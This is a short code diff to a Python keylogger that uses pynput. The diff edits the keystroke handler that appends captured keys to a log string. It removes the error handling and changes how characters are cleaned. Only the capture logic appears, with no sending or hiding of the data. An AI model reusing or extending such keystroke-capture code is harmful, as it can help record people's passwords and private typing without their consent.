@@ -134,15 +134,9 @@ def OnKeyboardEvent(event):
     elif event == Key.space:
         strKeyLogs += " "
     elif type(event) == Key:  # if the character is some other type of special key
-        try:
-            strKeyLogs += f" [{str(event)[4:]}] "
-        except Exception as e:
-            strKeyLogs += f"(Error logging character: {e})"
+        strKeyLogs += f" [{str(event)[4:]}] "
     else:
-        try:
-            strKeyLogs += f"{event}".replace("\"", "").replace("'", "")
-        except Exception as e:
-            strKeyLogs += f"(Error logging character: {e})"
+        strKeyLogs += f"{event}"[1:len(str(event)) - 1]
 
 
 KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
